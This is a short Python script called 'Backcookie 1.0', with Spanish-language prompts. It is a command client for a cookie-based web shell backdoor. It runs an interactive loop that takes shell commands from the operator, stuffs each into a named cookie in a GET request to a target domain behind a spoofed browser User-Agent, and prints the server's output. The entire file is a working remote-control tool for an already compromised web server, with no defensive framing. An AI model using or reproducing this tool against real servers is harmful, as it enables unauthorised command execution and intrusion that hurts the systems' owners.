import requests
import argparse

print('''\033[91m
========= ======== ======== ======== ======== 
=              Backcookie 1.0               =
=                                           = 
========= Create By Hernan Rodriguez ======== 
''')


def execute_command(domain, cookie, command):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', 'Cookie': f'{cookie}={command}'}
    response = requests.get(domain, headers=headers)
    return response.content.decode('utf-8')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--domain', help='Especifica el dominio', required=True)
    parser.add_argument('-c', '--cookie', help='Especifica la cookie', required=True)
    args = parser.parse_args()

    domain = args.domain
    cookie = args.cookie
    while True:
        command = input('Ingrese el comando a ejecutar (exit para salir): ')
        if command == 'exit':
            break
        response = execute_command(domain, cookie, command)
        print(response)
